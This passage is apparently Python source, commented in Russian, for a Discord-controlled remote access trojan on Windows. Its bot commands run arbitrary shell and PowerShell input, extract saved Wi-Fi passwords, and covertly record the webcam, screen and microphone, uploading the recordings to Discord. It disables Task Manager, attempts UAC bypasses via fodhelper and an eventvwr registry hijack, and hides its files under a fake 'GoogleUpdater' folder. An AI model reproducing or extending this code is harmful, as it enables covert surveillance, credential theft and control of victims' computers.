    # –ü–æ–ø—ã—Ç–∫–∞ –∏–∑–º–µ–Ω–∏—Ç—å –≥–æ–ª–æ—Å (–¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è –≤—ã—Å–æ—Ç—ã —Ç–æ–Ω–∞)
    voices = engine.getProperty('voices')
    if pitch < len(voices):  
        engine.setProperty('voice', voices[pitch].id)
    
    engine.say(text)
    engine.runAndWait()
    
    await ctx.send(f"üîä TTS Played at {speed} speed with pitch {pitch}.")

#---------CMD

@bot.command()
async def cmd(ctx, *, command: str):
    try:
        # –í—ã–ø–æ–ª–Ω—è–µ–º –∫–æ–º–∞–Ω–¥—É –¢–û–õ–¨–ö–û –µ—Å–ª–∏ –æ–Ω–∞ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
        if os.name == "nt":
            command = command.strip()
            if command == "ls":  # –ï—Å–ª–∏ —é–∑–µ—Ä –≤–≤—ë–ª 'ls' –Ω–∞ Windows, –∑–∞–º–µ–Ω—è–µ–º –Ω–∞ 'dir'
                command = "dir"
        
        # –í—ã–ø–æ–ª–Ω—è–µ–º –∫–æ–º–∞–Ω–¥—É —Å –ø—Ä–∞–≤–∏–ª—å–Ω–æ–π –∫–æ–¥–∏—Ä–æ–≤–∫–æ–π
        result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore")
        output = result.stdout if result.stdout else result.stderr

        if not output:
            output = "No output from command"

        await ctx.send(f"```{output[:1900]}```")  # –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –ø–æ –¥–ª–∏–Ω–µ —Å–æ–æ–±—â–µ–Ω–∏—è
    except Exception as e:
        await ctx.send(f"‚ùåError: {e}")

#---------CMD

@bot.command()
async def taskmake(ctx, task: str):
    try:
        result = subprocess.run([task], shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore")
        if result.returncode == 0:
            await ctx.send(f"‚úÖ`{task}` Started.")
        else:
            await ctx.send(f"‚ùåError `{task}`: {result.stderr}")
    except Exception as e:
        await ctx.send(f"‚ùåError: {e}")

@bot.command()
async def powershell(ctx, *, command: str):
    try:
        # –ó–∞–ø—É—Å–∫ –∫–æ–º–∞–Ω–¥—ã –≤ PowerShell
        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True, encoding="cp866", errors="ignore")
        output = result.stdout if result.stdout else result.stderr

        if not output:
            output = "No output from command"

        await ctx.send(f"```{output[:1900]}```")  # –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –ø–æ –¥–ª–∏–Ω–µ —Å–æ–æ–±—â–µ–Ω–∏—è
    except Exception as e:
        await ctx.send(f"‚ùåError: {e}")

@bot.command()
async def netinfo(ctx):
    try:
        local_ip_output = subprocess.run("ipconfig | findstr IPv4", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore").stdout
        public_ip_output = subprocess.run("nslookup myip.opendns.com resolver1.opendns.com", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore").stdout
        netstat_output = subprocess.run("netstat -ano", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore").stdout
        dns_cache_output = subprocess.run("ipconfig /displaydns", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore").stdout

        local_ips = re.findall(r'\d+\.\d+\.\d+\.\d+', local_ip_output)
        public_ips = re.findall(r'\d+\.\d+\.\d+\.\d+', public_ip_output)
        netstat_lines = netstat_output.splitlines()[:10]  # –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –≤—ã–≤–æ–¥–∞
        dns_cache_lines = dns_cache_output.splitlines()[:10]  # –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –≤—ã–≤–æ–¥–∞

        output = (
            f"Local IPs:\n" + "\n".join(local_ips) +
            f"\n\nPublic IPs:\n" + "\n".join(public_ips) +
            f"\n\nConnections:\n" + "\n".join(netstat_lines) +
            f"\n\nLast DNS connections:\n" + "\n".join(dns_cache_lines)
        )

        await ctx.send(f"```{output[:1900]}```")
    except Exception as e:
        await ctx.send(f"–û—à–∏–±–∫–∞: {e}")


@bot.command()
async def ping(ctx, site: str):
    try:
        result = subprocess.run(["ping", "-n", "4", site], capture_output=True, text=True, encoding="cp866", errors="ignore")
        output = result.stdout if result.stdout else result.stderr
        await ctx.send(f"```{output[:1900]}```")
    except Exception as e:
        await ctx.send(f"‚ùåError: {e}")

@bot.command()
async def packet(ctx, site: str, packets: int = None, strength: int = None):
    if packets is None or strength is None:
        await ctx.send("‚ùå **Incorrect!** Try: `!packet <—Å–∞–π—Ç> <–∫–æ–ª-–≤–æ –ø–∞–∫–µ—Ç–æ–≤> <—Ä–∞–∑–º–µ—Ä –ø–∞–∫–µ—Ç–∞>`\n\n**True:**\n`!packet google.com 10 64`\n`!packet 8.8.8.8 5 128`")
        return
    
    try:
        result = subprocess.run(["ping", "-n", str(packets), "-l", str(strength), site], capture_output=True, text=True, encoding="cp866", errors="ignore")
        output = result.stdout if result.stdout else result.stderr
        
        sent_packets = len(re.findall(r'–û—Ç–≤–µ—Ç –æ—Ç', output))
        lost_packets = len(re.findall(r'–ü—Ä–µ–≤—ã—à–µ–Ω –∏–Ω—Ç–µ—Ä–≤–∞–ª –æ–∂–∏–¥–∞–Ω–∏—è', output))
        
        detailed_output = (
            f"üì° **Ping results for {site}:**\n"
            f"üîπ **Sent Packets:** {sent_packets} / {packets}\n"
            f"‚ùå **Lost Packets:** {lost_packets}\n"
            f"üí• **Packet Strength:** {strength} bytes\n"
            f"üìä **Full Output:**\n```{output[:1500]}```"
        )
        await ctx.send(detailed_output)
    except subprocess.TimeoutExpired:
        await ctx.send("‚úÖ Packets sent, but response timeout expired.")
    except Exception as e:
        await ctx.send(f"‚ùå Error: {e}")

@bot.command()
async def admin(ctx, title: str = None, icon_url: str = None, method: str = "uac"):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")
    
    supported_formats = [".png", ".ico", ".jpg", ".jpeg"]
    methods = ["uac", "schtask", "bypass", "eventvwr", "slui", "silent"]
    
    if not title or not icon_url or method not in methods:
        return await ctx.send(f"‚ùå Incorrect command usage! Use: `!admin <title> <icon_url> <method>`\nSupported icon formats: {', '.join(supported_formats)}\nMethods: {', '.join(methods)}")
    
    if not any(icon_url.endswith(ext) for ext in supported_formats):
        return await ctx.send(f"‚ùå Unsupported icon format! Supported formats: {', '.join(supported_formats)}")
    
    if method == "uac":
        script = 'Start-Process -FilePath "powershell" -ArgumentList "-Command Start-Process powershell -Verb runAs"'
    elif method == "schtask":
        script = f'Schtasks /Create /TN "{title}" /TR "powershell -Command Start-Process powershell -Verb runAs" /SC ONCE /ST 00:00 /RL HIGHEST & Schtasks /Run /TN "{title}"'
    elif method == "bypass":
        script = 'Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"'
    elif method == "eventvwr":
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\Classes\\mscfile\\shell\\open\\command"
            winreg.CreateKey(key, subkey)
            registry_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(registry_key, None, 0, winreg.REG_SZ, f'cmd.exe /k powershell -Command Start-Process powershell -Verb runAs')
            winreg.CloseKey(registry_key)
            script = 'Start-Process -FilePath "eventvwr.exe"'
        except Exception as e:
            return await ctx.send(f"‚ùå Failed to modify registry: {e}")
    elif method == "slui":
        script = 'Start-Process -FilePath "C:\\Windows\\System32\\slui.exe"'
    elif method == "silent":
        script = '''
        $obj = New-Object -ComObject Shell.Application;
        $obj.ShellExecute("powershell", "-Command Start-Process powershell -Verb runAs", "", "runas", 1);
        '''
    
    try:
        subprocess.run(["powershell", "-Command", script], shell=True)
        await ctx.send(f"‚úÖ Admin rights requested using method: {method}\nTitle: {title}, Icon: {icon_url}")
    except Exception as e:
        await ctx.send(f"‚ùå Failed to request admin rights: {e}")

@bot.command()
async def legitadmin(ctx):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")
    
    if not ctypes.windll.shell32.IsUserAnAdmin():
        await ctx.send("üîÑ Requesting admin rights...")
        try:
            script = f'PowerShell -Command "Start-Process python -ArgumentList \'{sys.argv[0]}\' -Verb RunAs"'
            subprocess.run(script, shell=True)
            sys.exit()
        except Exception as e:
            await ctx.send(f"‚ùå Failed to request admin rights: {e}")
    else:
        await ctx.send("‚úÖ Already running with admin rights!")



@bot.command()
async def checkadmin(ctx):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")
    
    checks = []
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —á–µ—Ä–µ–∑ net session
    try:
        result = subprocess.run("net session", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore")
        if result.returncode == 0:
            checks.append("‚úÖ Net session: Admin rights confirmed.")
        else:
            checks.append("‚ùå Net session: No admin rights.")
    except:
        checks.append("‚ùå Net session: Error running command.")
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–ø–∏—Å–∏ –≤ —Å–∏—Å—Ç–µ–º–Ω—É—é –ø–∞–ø–∫—É
    try:
        test_path = "C:\\Windows\\Temp\\test_admin.txt"
        with open(test_path, "w") as f:
            f.write("admin_check")
        os.remove(test_path)
        checks.append("‚úÖ File write test: Admin rights confirmed.")
    except:
        checks.append("‚ùå File write test: No admin rights.")
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —á–µ—Ä–µ–∑ whoami /priv
    try:
        result = subprocess.run("whoami /priv", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore")
        if "SeShutdownPrivilege" in result.stdout:
            checks.append("‚úÖ Whoami priv: Admin rights confirmed.")
        else:
            checks.append("‚ùå Whoami priv: No admin rights.")
    except:
        checks.append("‚ùå Whoami priv: Error running command.")
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —á—Ç–µ–Ω–∏—è —Ä–µ–µ—Å—Ç—Ä–∞ —Å –∞–¥–º–∏–Ω-–ø—Ä–∞–≤–∞–º–∏
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion", 0, winreg.KEY_READ) as key:
            checks.append("‚úÖ Registry read: Admin rights confirmed.")
    except:
        checks.append("‚ùå Registry read: No admin rights.")
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è fsutil (—Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω –º–æ–∂–µ—Ç)
    try:
        result = subprocess.run("fsutil dirty query C:", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore")
        if "is NOT Dirty" in result.stdout or "is Dirty" in result.stdout:
            checks.append("‚úÖ Fsutil: Admin rights confirmed.")
        else:
            checks.append("‚ùå Fsutil: No admin rights.")
    except:
        checks.append("‚ùå Fsutil: Error running command.")
    
    await ctx.send("\n".join(checks))

#---------------------------NEW FUCNTIONS----------------------------------

@bot.command()
async def keybind(ctx, keys: str):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")
    try:
        keys = keys.replace("+", " ")
        subprocess.run(["powershell", "-Command", f"(New-Object -ComObject WScript.Shell).SendKeys('{keys}')"], creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send("‚úÖ Keybind executed.")
    except Exception as e:
        await ctx.send(f"‚ùå ERROR: {e}")

@bot.command()
async def lockmgr(ctx, state: str):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")
    try:
        command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f" if state == "on" else "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /f"
        subprocess.run(command, shell=True)
        await ctx.send(f"‚úÖ Task Manager {'disabled' if state == 'on' else 'enabled'}.")
    except Exception as e:
        await ctx.send(f"‚ùå ERROR: {e}")

#-------wifipass

@bot.command()
async def wifipass(ctx):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")

    try:
        password_info = ""

        # –ú–µ—Ç–æ–¥ 1: Netsh
        try:
            result = subprocess.run("chcp 65001 & netsh wlan show profiles", shell=True, capture_output=True, text=True, encoding="utf-8", errors="ignore")
            profiles = re.findall(r"–í—Å–µ –ø—Ä–æ—Ñ–∏–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π\s*:\s*(.+)", result.stdout)
            
            if profiles:
                for profile in profiles:
                    profile = profile.strip()
                    profile_info = subprocess.run(f'chcp 65001 & netsh wlan show profile name="{profile}" key=clear', shell=True, capture_output=True, text=True, encoding="utf-8", errors="ignore").stdout
                    password_match = re.search(r"–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –∫–ª—é—á–∞\s*:\s*(.+)", profile_info)
                    password = password_match.group(1).strip() if password_match else "üîí –ù–µ—Ç –ø–∞—Ä–æ–ª—è"
                    password_info += f"üõú {profile}\nüîì {password}\n\n"
        except Exception as e:
            password_info += f"‚ö† –û—à–∏–±–∫–∞ netsh: {e}\n\n"

        # –ú–µ—Ç–æ–¥ 2: –ß—Ç–µ–Ω–∏–µ –∏–∑ —Ä–µ–µ—Å—Ç—Ä–∞ (–µ—Å–ª–∏ –≤–æ–∑–º–æ–∂–Ω–æ)
        try:
            key_path = r"SOFTWARE\Microsoft\WlanSvc\Interfaces"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    iface_name = winreg.EnumKey(key, i)
                    subkey_path = f"{key_path}\\{iface_name}\\Profiles"
                    try:
                        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, subkey_path) as subkey:
                            for j in range(winreg.QueryInfoKey(subkey)[0]):
                                wifi_name = winreg.EnumKey(subkey, j)
                                password_info += f"üõú {wifi_name} (–∏–∑ —Ä–µ–µ—Å—Ç—Ä–∞)\nüîì –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ\n\n"
                    except FileNotFoundError:
                        pass
        except Exception as e:
            password_info += f"‚ö† –û—à–∏–±–∫–∞ —Ä–µ–µ—Å—Ç—Ä–∞: {e}\n\n"

        # –ú–µ—Ç–æ–¥ 3: PowerShell (–∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–±)
        try:
            powershell_script = "(netsh wlan show profile) | ForEach-Object {$_ -match '–í—Å–µ –ø—Ä–æ—Ñ–∏–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π\\s*:\\s*(.+)' | Out-Null; $matches[1] }"
            result = subprocess.run(["powershell", "-Command", powershell_script], capture_output=True, text=True)
            profiles_ps = result.stdout.strip().split("\n")
            for profile in profiles_ps:
                profile = profile.strip()
                if profile:
                    profile_info = subprocess.run(["powershell", "-Command", f"netsh wlan show profile name='{profile}' key=clear"], capture_output=True, text=True)
                    password_match = re.search(r"–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –∫–ª—é—á–∞\s*:\s*(.+)", profile_info.stdout)
                    password = password_match.group(1).strip() if password_match else "üîí –ù–µ—Ç –ø–∞—Ä–æ–ª—è"
                    password_info += f"üõú {profile} (PowerShell)\nüîì {password}\n\n"
        except Exception as e:
            password_info += f"‚ö† –û—à–∏–±–∫–∞ PowerShell: {e}\n\n"

        # –ü—Ä–æ–≤–µ—Ä–∫–∞, –µ—Å—Ç—å –ª–∏ –ø–∞—Ä–æ–ª–∏
        if not password_info.strip():
            await ctx.send("‚ùå No saved WIFI founded.")
            return

        await ctx.send(f"üîë WiFi Passwords:\n\n{password_info.strip()}")

    except Exception as e:
        await ctx.send(f"‚ùå ERROR: {e}")

#-------wifipass


@bot.command()
async def cd(ctx, action: str = "open"):
    """Opens or closes the CD tray (if possible)."""
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")

    action = action.lower()

    def get_cd_drives():
        """Returns a list of available CD/DVD drives (e.g., ['D:', 'E:'])."""
        drives = []
        bitmask = win32api.GetLogicalDrives()
        for letter in range(26):  # A-Z
            if bitmask & (1 << letter):
                drive = f"{chr(65 + letter)}:\\"
                if win32file.GetDriveType(drive) == win32con.DRIVE_CDROM:
                    drives.append(drive)
        return drives

    def open_tray():
        """Tries to open all detected CD trays."""
        success = False
        drives = get_cd_drives()
        
        for drive in drives:
            try:
                subprocess.run(f"powershell -Command (New-Object -ComObject Shell.Application).Namespace(17).ParseName('{drive}').InvokeVerb('Eject')", check=True)
                success = True
            except:
                pass

            try:
                ctypes.windll.winmm.mciSendStringW(f"set cdaudio door open", None, 0, None)
                success = True
            except:
                pass

        return success

    def close_tray():
        """Tries to close all detected CD trays."""
        success = False
        drives = get_cd_drives()

        for drive in drives:
            try:
                ctypes.windll.winmm.mciSendStringW(f"set cdaudio door closed", None, 0, None)
                success = True
            except:
                pass

        return success

    # Execute action
    if action == "open":
        if open_tray():
            await ctx.send("‚úÖ CD tray opened.")
        else:
            await ctx.send("‚ùå Failed to open CD tray.")
    elif action == "close":
        if close_tray():
            await ctx.send("‚úÖ CD tray closed.")
        else:
            await ctx.send("‚ùå Failed to close CD tray.")
    else:
        await ctx.send("‚ùå Use: `!cd open` or `!cd close`.")


@bot.command()
async def rickroll(ctx):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")
    try:
        await ctx.send("üîÑ downloading rickroll...")
        rickroll_url = "https://www.myinstants.com/media/sounds/rickroll.mp3"
        local_path = os.path.join(VIDEO_PATH, "rickroll.mp3")

        response = requests.get(rickroll_url)
        with open(local_path, "wb") as f:
            f.write(response.content)

        await ctx.send("üéµ Rickrolling...")
        pygame.mixer.init()
        pygame.mixer.music.load(local_path)
        pygame.mixer.music.play()

        # –û–∂–∏–¥–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Ç—Ä–µ–∫–∞
        while pygame.mixer.music.get_busy():
            await asyncio.sleep(1)

        pygame.mixer.quit()
        os.remove(local_path)  # –£–¥–∞–ª—è–µ–º —Ñ–∞–π–ª –ø–æ—Å–ª–µ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è
        await ctx.send("‚úÖ RickRolled!")

    except Exception as e:
        await ctx.send(f"‚ùå ERROR: {e}")

@bot.command()
async def video_cam(ctx, duration: str = "10s"):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")
    
    time_map = {"s": 1, "m": 60}
    unit = duration[-1]
    if unit not in time_map or not duration[:-1].isdigit():
        return await ctx.send("‚ùå Invalid time format! Use 10s or 1m.")
    
    seconds = int(duration[:-1]) * time_map[unit]
    output_file = os.path.join(VIDEO_PATH, "webcam.mp4")
    
    message = await ctx.send("üì∑ Checking for cameras...")
    
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return await message.edit(content="‚ùå Camera not found")
    
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    out = cv2.VideoWriter(output_file, fourcc, 20.0, (int(cap.get(3)), int(cap.get(4))))
    
    await message.edit(content="üé• Recording...")
    start_time = time.time()
    while time.time() - start_time < seconds:
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)
    
    cap.release()
    out.release()
    
    await message.edit(content="üì§ Sending...")
    await ctx.send(file=discord.File(output_file))
    os.remove(output_file)
    await message.edit(content="‚úÖ Recorded and Sended")


#---------------------------NEW FUCNTIONS----------------------------------

FFMPEG_PATH = os.path.join(os.getenv("APPDATA"), "GoogleUpdater", "files", "ffmpeg.exe")
VIDEO_PATH = os.path.join(os.getenv("APPDATA"), "GoogleUpdater", "files", "data")
os.makedirs(VIDEO_PATH, exist_ok=True)


def download_ffmpeg():
    if not os.path.exists(FFMPEG_PATH):
        url = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
        zip_path = os.path.join(VIDEO_PATH, "ffmpeg.zip")
        exe_dir = os.path.join(VIDEO_PATH, "ffmpeg")
        return url, zip_path, exe_dir
    return None, None, None

@bot.command()
async def video_desk(ctx, duration: str = "10s"):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")
    
    message = await ctx.send("‚è≥ Checking FFMPEG...")
    
    url, zip_path, exe_dir = download_ffmpeg()
    if url:
        await message.edit(content="üì• downloading FFMPEG...")
        try:
            response = requests.get(url, stream=True)
            with open(zip_path, "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            await message.edit(content="üìÇ Unpacking...")
            subprocess.run(["powershell", "Expand-Archive", "-Path", zip_path, "-DestinationPath", exe_dir, "-Force"], creationflags=subprocess.CREATE_NO_WINDOW)
            
            ffmpeg_bin_path = os.path.join(exe_dir, "ffmpeg-7.1-essentials_build", "bin", "ffmpeg.exe")
            if os.path.exists(ffmpeg_bin_path):
                shutil.move(ffmpeg_bin_path, FFMPEG_PATH)
            else:
                return await message.edit(content="‚ùå Error: FFMPEG.exe not found after unpacking")
            
            os.remove(zip_path)
            await message.edit(content="‚úÖ FFMpeg installed!")
        except Exception as e:
            return await message.edit(content=f"‚ùå Error when installing: {e}")
    else:
        await message.edit(content="‚úÖ FFMpeg installed alredy")
    
    time_map = {"s": 1, "m": 60}
    unit = duration[-1]
    if unit not in time_map or not duration[:-1].isdigit():
        return await ctx.send("‚ùå Invalid time format! Use 10s or 1m.")
    
    seconds = int(duration[:-1]) * time_map[unit]
    output_file = os.path.join(VIDEO_PATH, "output.mp4")
    
    try:
        await message.edit(content="üé• Recording...")
        command = f'"{FFMPEG_PATH}" -y -f gdigrab -framerate 30 -t {seconds} -i desktop "{output_file}"'
        subprocess.run(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        await message.edit(content="üì§ Sending...")
        await ctx.send(file=discord.File(output_file))
        os.remove(output_file)
        await message.edit(content="‚úÖ Recorded and sended!")
    except Exception as e:
        await message.edit(content=f"‚ùå ERROR: {e}")


#---------------------------FFMPEG----------------------------------

@bot.command()
async def sound(ctx, url: str):
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")
    try:
        await ctx.send("üîÑ Downloading audio...")
        file_name = url.split("/")[-1]
        local_path = os.path.join(VIDEO_PATH, file_name)

        response = requests.get(url)
        with open(local_path, "wb") as f:
            f.write(response.content)

        await ctx.send(f"üéµ Recording {file_name}...")
        pygame.mixer.init()
        pygame.mixer.music.load(local_path)
        pygame.mixer.music.play()

        # –û–∂–∏–¥–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Ç—Ä–µ–∫–∞
        while pygame.mixer.music.get_busy():
            await asyncio.sleep(1)

        pygame.mixer.quit()
        os.remove(local_path)  # –£–¥–∞–ª—è–µ–º —Ñ–∞–π–ª –ø–æ—Å–ª–µ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è
        await ctx.send("‚úÖ Sound played!")

    except Exception as e:
        await ctx.send(f"‚ùå ERROR: {e}")

#---------------------------UNLOCKERSOUND----------------------------------

def mute_system_sound(mute=True):
    # –ò—Å–ø–æ–ª—å–∑—É–µ–º Windows API –¥–ª—è –æ—Ç–∫–ª—é—á–µ–Ω–∏—è/–≤–∫–ª—é—á–µ–Ω–∏—è –∑–≤—É–∫–∞
    device_id = 0  # –û–±—ã—á–Ω–æ –æ—Å–Ω–æ–≤–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –≤—ã–≤–æ–¥–∞
    mute_flag = 1 if mute else 0
    try:
        # –ó–∞–ø—Ä–æ—Å –æ—Ç–∫–ª—é—á–µ–Ω–∏—è/–≤–∫–ª—é—á–µ–Ω–∏—è –∑–≤—É–∫–∞ —á–µ—Ä–µ–∑ Windows API
        ctypes.windll.winmm.waveOutSetVolume(device_id, mute_flag * 0xFFFF)
        return True
    except Exception as e:
        return False

def is_sound_muted():
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ—Å—Ç–æ—è–Ω–∏—è –∑–≤—É–∫–∞
    try:
        volume = ctypes.c_uint()
        ctypes.windll.winmm.waveOutGetVolume(0, ctypes.byref(volume))
        return volume.value == 0
    except Exception as e:
        return None

@bot.command()
async def unlocksound(ctx):
    muted = is_sound_muted()
    if muted is None:
        await ctx.send("‚ùå cant found sound info")
    elif muted:
        if mute_system_sound(False):
            await ctx.send("üîä Unlocked sound!")
        else:
            await ctx.send("‚ùå Cant unblock sound")
    else:
        await ctx.send("‚úÖ Sound is enabled alredy!")

#----------------------------UNLOCKERSOUND---------------------------------

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø–∏—Å–∏ –∞—É–¥–∏–æ
def record_audio(microphone, duration, filename):
    p = pyaudio.PyAudio()
    
    # –û—Ç–∫—Ä—ã–≤–∞–µ–º –ø–æ—Ç–æ–∫ —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–æ–º
    stream = p.open(format=pyaudio.paInt16,
                    channels=1,
                    rate=44100,
                    input=True,
                    frames_per_buffer=1024)

    print(f"Recording from {microphone} for {duration} seconds...")

    frames = []
    for _ in range(0, int(44100 / 1024 * duration)):
        data = stream.read(1024)
        frames.append(data)

    # –ó–∞–≤–µ—Ä—à–∞–µ–º –∑–∞–ø–∏—Å—å
    print("Recording complete.")
    stream.stop_stream()
    stream.close()
    p.terminate()

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ —Ñ–∞–π–ª
    if not os.path.exists(VIDEO_PATH):
        os.makedirs(VIDEO_PATH)

    with wave.open(filename, 'wb') as wf:
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(frames))

# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –∑–∞–ø–∏—Å–∏ –∞—É–¥–∏–æ
@bot.command()
async def audiorec(ctx, microphone: str, duration: str):
    # –†–∞–∑–±–æ—Ä –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏
    try:
        if duration.endswith('s'):
            duration = int(duration[:-1])
        elif duration.endswith('m'):
            duration = int(duration[:-1]) * 60
        else:
            raise ValueError("‚ùå Invalid duration format. Use 's' or 'm'.")
    except ValueError as e:
        await ctx.send(f"–û—à–∏–±–∫–∞: {str(e)}")
        return
    
    # –ó–∞–ø–∏—Å—å –∞—É–¥–∏–æ
    filename = os.path.join(VIDEO_PATH, "audio_recording.wav")
    record_audio(microphone, duration, filename)
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–∞–π–ª –≤ Discord
    await ctx.send("‚úÖ Recorded Microphone...", delete_after=5)
    await ctx.send(file=discord.File(filename))

    # –£–¥–∞–ª—è–µ–º —Ñ–∞–π–ª –ø–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏
    os.remove(filename)

@bot.command()
async def Microlist(ctx):
    """List available microphones, removing duplicates and irrelevant names."""
    p = pyaudio.PyAudio()

    # Get a list of all available microphones
    mic_list = []
    for i in range(p.get_device_count()):
        info = p.get_device_info_by_index(i)
        if info.get('maxInputChannels') > 0:
            mic_name = info.get('name')

            # Filter out invalid or corrupted names
            if is_valid_microphone_name(mic_name):
                mic_list.append(mic_name)

    # Remove duplicates by converting the list to a set and back to a list
    unique_mic_list = list(set(mic_list))

    if unique_mic_list:
        # Format the output message with a header and list of microphones
        formatted_mic_list = "\n".join(unique_mic_list)
        await ctx.send(f"üé§ Available microphones:\n{formatted_mic_list}")
    else:
        await ctx.send("No valid microphones found.")

def is_valid_microphone_name(name):
    """Filters out invalid or corrupted microphone names."""
    # List of invalid keywords that might indicate corrupted names
    invalid_keywords = [
        "–†—ü–†¬µ–°–Ç–†–Ü–†—ë–°‚Ä°–†–Ö–°‚Äπ–†‚Ññ", "–†“ë–°–Ç–†¬∞–†‚Ññ–†–Ü–†¬µ–°–Ç", "–†¬∑–†¬∞–†—ó–†—ë–°–É–†—ë", "–†¬∑–†–Ü–°—ì–†—î–†¬∞", 
        "–†—ü–†¬µ–°–Ç–†¬µ–ù", "Input", "–ü—Ä–æ–≤–µ—Ä—å—Ç–µ", "System", "Default", "Unknown"
    ]

    # Check if any invalid keyword is in the name (case insensitive)
    for keyword in invalid_keywords:
        if keyword.lower() in name.lower():
            return False
    return True

#-----------------------------MICRAPHONE

# –ü—É—Ç–∏ –¥–ª—è —Ñ–∞–π–ª–æ–≤
appdata_path = os.getenv("APPDATA")
scripts_dir = os.path.join(appdata_path, "GoogleUpdater", "files")

# –§–∞–π–ª—ã –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏
ps1_url = "https://raw.githubusercontent.com/Clicketyclick/ChangeScreenOrientation/refs/heads/master/ChangeOrientation.ps1"
cmd_url = "https://raw.githubusercontent.com/Clicketyclick/ChangeScreenOrientation/refs/heads/master/co.cmd"

ps1_file = os.path.join(scripts_dir, "ChangeOrientation.ps1")
cmd_file = os.path.join(scripts_dir, "co.cmd")

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤
def download_file(url, dest_path):
    urllib.request.urlretrieve(url, dest_path)

